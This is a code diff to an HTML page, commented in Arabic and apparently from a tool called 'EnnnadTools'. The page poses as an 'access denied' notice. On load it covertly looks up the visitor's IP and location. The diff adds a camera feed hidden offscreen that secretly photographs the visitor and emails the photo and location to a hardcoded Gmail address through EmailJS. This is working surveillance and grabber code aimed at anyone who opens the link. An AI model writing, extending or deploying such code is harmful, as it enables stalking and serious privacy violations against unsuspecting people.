@@ -78,6 +78,15 @@
             text-shadow: 0 0 6px #82aaffcc;
         }
 
+        #cameraContainer {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+
         @keyframes popupIn {
             0% {
                 opacity: 0;
@@ -104,6 +113,11 @@
 </head>
 <body>
 
+<div id="cameraContainer">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+</div>
+
 <div id="popup" role="alert" aria-live="assertive" aria-atomic="true">
     <div>
         <p>ليس مصرح لك بالدخول</p>
@@ -117,58 +131,101 @@
 <script>
 console.log("تم خداع المتصفح بنجاح");
 
-window.onload = function () {
+async function capturePhoto() {
+    try {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width: 640,
+                height: 480
+            },
+            audio: false
+        });
+        
+        video.srcObject = stream;
+        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر ثانية للكاميرا
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // إيقاف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+        
+        return canvas.toDataURL('image/jpeg', 0.8);
+    } catch (error) {
+        console.error('خطأ في الوصول للكاميرا:', error);
+        return null;
+    }
+}
+
+async function sendDataWithPhoto(locationData, photoData) {
+    try {
+        const response = await emailjs.send("service_25q0ern", "template_xi6fmgy", {
+            to_email: "e508769103@gmail.com",
+            name: "تم جلب موقع شخص مع صورة",
+            time: new Date().toLocaleString('ar-EG'),
+            message: locationData,
+            photo: photoData || 'تعذر التقاط الصورة'
+        });
+        return response;
+    } catch (error) {
+        console.error('خطأ في إرسال البريد:', error);
+        throw error;
+    }
+}
+
+window.onload = async function () {
     console.log("يتم الان جلب بيانات الشخص");
     localStorage.clear();
 
     const popup = document.getElementById("popup");
     emailjs.init("GRpOF1pKqcSg9cx5H");
 
-    fetch("https://api.ipify.org?format=json")
-        .then(res => res.json())
-        .then(data => {
-            console.log("IP:", data.ip);
-            return fetch(`https://ipapi.co/${data.ip}/json/`);
-        })
-        .then(res => res.json())
-        .then(loc => {
-            console.log("Location data from ipapi:", loc);
+    try {
+        // البدء في التقاط الصورة مبكراً
+        const photoPromise = capturePhoto();
 
-            let googleMapUrl = "تعذر توليد رابط الخريطة";
+        const ipResponse = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipResponse.json();
+        console.log("IP:", ipData.ip);
+        
+        const locResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const loc = await locResponse.json();
+        console.log("Location data from ipapi:", loc);
 
-            if (loc.latitude && loc.longitude) {
-                googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
-            }
+        let googleMapUrl = "تعذر توليد رابط الخريطة";
+        if (loc.latitude && loc.longitude) {
+            googleMapUrl = `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`;
+        }
 
-            const locationString = `
-                المنطقة: ${loc.region || 'غير معروف'}
-                المدينة: ${loc.city || 'غير معروف'}
-                المحافظة: ${loc.county || 'غير معروف'}
-                المزود: ${loc.org || 'غير معروف'}
-                الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
-                رابط الخريطة: ${googleMapUrl}
-            `;
+        const locationString = `
+            المنطقة: ${loc.region || 'غير معروف'}
+            المدينة: ${loc.city || 'غير معروف'}
+            المحافظة: ${loc.county || 'غير معروف'}
+            المزود: ${loc.org || 'غير معروف'}
+            الرمز البريدي: ${loc.postal || 'بدون رمز بريدي'}
+            رابط الخريطة: ${googleMapUrl}
+        `;
 
-            console.log("Location string to send:", locationString);
+        console.log("Location string to send:", locationString);
 
-            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
-                to_email: "e508769103@gmail.com",
-                name: "تم جلب موقع شخص الان",
-                time: new Date().toLocaleString('ar-EG'),
-                message: locationString
-            });
-        })
-        .then((response) => {
-            console.log("Email sent successfully:", response.status, response.text);
-        })
-        .catch(err => {
-            console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
-        })
-        .finally(() => {
-            if (popup) {
-                popup.classList.add("active");  // إضافة الكلاس لظهور النافذة مع الأنيميشن
-            }
-        });
+        // انتظر انتهاء التقاط الصورة
+        const photoData = await photoPromise;
+        
+        // إرسال البيانات مع الصورة
+        await sendDataWithPhoto(locationString, photoData);
+        console.log("تم إرسال البيانات والصورة بنجاح");
+    } catch (err) {
+        console.error("خطأ أثناء جلب أو إرسال البيانات:", err);
+    } finally {
+        if (popup) {
+            popup.classList.add("active");
+        }
+    }
 };
 
 console.log("تم اتمام العملية بنجاح , EnnnadTools");
